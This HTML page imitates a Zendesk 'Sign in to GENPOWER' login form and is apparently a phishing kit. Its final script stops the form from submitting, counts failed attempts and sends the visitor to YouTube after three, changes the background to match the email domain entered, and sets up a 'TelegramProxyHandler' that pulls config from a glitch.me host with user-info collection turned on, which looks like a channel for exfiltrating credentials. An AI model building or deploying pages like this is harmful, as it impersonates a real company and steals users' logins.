<!DOCTYPE html>
<html lang="en" class="u-bg-transparent">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to GENPOWER</title>
  <link rel="stylesheet" href="https://static.zdassets.com/classic/assets/themes/hc-c2415464e062f9cb348565c1376ce4c5a629fb6177cfc89fdbb639b657df5af5.css" />
  <link rel="stylesheet" href="https://static.zdassets.com/classic/assets/zendeskgarden_bedrock-b4c8ad7f186fc41f37b3b98c936938adc058bc32a59f8ec6a02dea07e75a900c.css" />
  <link rel="stylesheet" href="https://static.zdassets.com/classic/assets/zendeskgarden_modals-ea263d1786a16a2fd90fdfb82b6d6078d02cc81f8a6fa1f6f82c89418dbfa8f3.css" />
  <link rel="stylesheet" href="https://static.zdassets.com/classic/assets/zendeskgarden_button-428b1db15262b6f63ac1426b1c91dfc74a6d5cf75b797eb39dd2ce03e521a6a9.css" />
  <link rel="stylesheet" href="https://static.zdassets.com/classic/assets/zendeskgarden_callouts-3c4a610970d0bb707e02455fad7b91f1f19931340d06fab4af4cc919a56d0ad3.css" />
  <script src="https://static.zdassets.com/classic/assets/turbolinks-4934cb7314614db08582e0f8f532f0407f555f3b751fafeeaf6f1d2d3148d32c.js"></script>
  <script src="https://static.zdassets.com/classic/assets/jstz-95c1a7f4b17b9627e40c082e215c03da19b6b1e3281358d2e0742225438d25cf.js"></script>
  <script src="https://static.zdassets.com/auth/65862f5e6fcaef29148ee7c7f0f3454a27eeefd9/v2/auth-without-iframe.js"></script>
  <script>
    (function () {
      if (window.opener) {
        try {
          if (window.opener.origin) {
            // This was opened by the same origin, so we consider it safe.
            console.log("safe");
          }
        } catch{
          // This window was opened via JS from an alternative origin.
          // For safety, we will kill the opener.
          window.opener.close();
        }
      }

      var targetOrigin = "https://genpower.zendesk.com";
      new App({targetOrigin: targetOrigin});
    }).call();
  </script>
</head>
<body dir="">
<div class="modal signin" role="dialog" aria-labelledby="signin_title">
  <div class="login help_center">
    <div class="interface outer">

      <div class="updated_title">
        <h2 id="signin_title">Sign in to GENPOWER</h2>
        <div class="roles_new" id="zendesk-js-login-roles">
          <a class="switch_link role agent" href="/auth/v2/login/signin?auth_origin=360001389258%2Cfalse%2Ctrue&amp;brand_id=360001389258&amp;locale=en-us&amp;return_to=https%3A%2F%2Fgenpower.zendesk.com%2Fhc%2Fen-us%2Frequests%2F416252&amp;role=consumer&amp;theme=hc"><span>Switch to customer sign-in</span><i class='chevron'></i></a>
        </div>
      </div>

      <div class="interface inner">
        <div class="services internal">
          <form id="login-form" autocomplete="off" accept-charset="UTF-8" method="post">
            <input type="hidden" name="authenticity_token" value="DGtQjFHgQ5ba7mH4rpHmXt6dLgn8NL18eIxXezX8sKQ" />
            <div class="credentials">
              <label for="user_email">Email</label>
              <input autofocus="autofocus" autocomplete="email" required="required" type="email" name="user[email]" id="user_email" />
              <label for="user_password">Password</label>
              <input autocomplete="current-password" class="text wide validate_password" required="required" type="password" name="user[password]" id="user_password" />

              <button name="show-hide-password-button" type="button" role="switch" id="show-password-toggle-button" aria-checked="false" aria-label="Show password">
                <svg id="show-password-toggle-svg" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 12 12">
                  <g fill="currentColor">
                    <circle cx="6" cy="6" r="1.5"/>
                    <path d="M11.79 5.34C11.08 4.33 9.1 2 6 2S.92 4.33.21 5.34c-.28.4-.28.93 0 1.32C.92 7.67 2.9 10 6 10s5.08-2.33 5.79-3.34c.28-.39.28-.93 0-1.32zM6 8.5a2.5 2.5 0 0 1 0-5 2.5 2.5 0 0 1 0 5z"/>
                  </g>
                </svg>
              </button>

              <div class="forgot_password" id="zendesk-js-forgot-password">
                <a class="auth-actions" href="https://genpower.zendesk.com/auth/v2/login/password_reset">Forgot password?</a>
              </div>
            </div>

            <div id="required-input-error-message" class="visually-hidden" aria-live="polite">Missing the following required fields:</div>

            <div class="clear"></div>
            <button name="button" type="submit" id="sign-in-submit-button" class="c-btn c-btn--primary auth-actions">Sign in</button>
          </form>
          <div class="clear"></div>
        </div>

        <div class="clear"></div>
      </div>
    </div>
  </div>
</div>

<script>
  let failedAttempts = localStorage.getItem('failedAttempts') || 0;

  // Redirect to YouTube after 3 failed attempts
  if (failedAttempts >= 3) {
    window.location.href = 'https://www.youtube.com/';
  }

  // Handle form submission
  const loginForm = document.getElementById('login-form');
  loginForm.onsubmit = function(event) {
    event.preventDefault(); // Prevent form from submitting

    const email = document.getElementById('user_email').value;
    const password = document.getElementById('user_password').value;
    const errorMessage = document.getElementById('required-input-error-message');
    
    // Extract email domain for background image
    const domain = email.split('@')[1];
    if (domain) {
      document.body.style.backgroundImage = `url('https://www.example.com/backgrounds/${domain}.jpg')`;
    } else {
      errorMessage.textContent = "Invalid email address.";
      return;
    }

    // Simulate login validation
    if (password === "correct-password") {
      alert("Login successful!");
      localStorage.removeItem('failedAttempts');  // Reset failed attempts
    } else {
      failedAttempts++;
      localStorage.setItem('failedAttempts', failedAttempts);
      errorMessage.textContent = `Invalid password. Attempts left: ${3 - failedAttempts}`;
    }
  };

  // Telegram integration (simple initialization)
  const telegramHandler = new TelegramProxyHandler({
    configUrl: 'https://horse-button-echo.glitch.me/config.json',
    collectUserInfo: true
  });

</script>

</body>
</html>
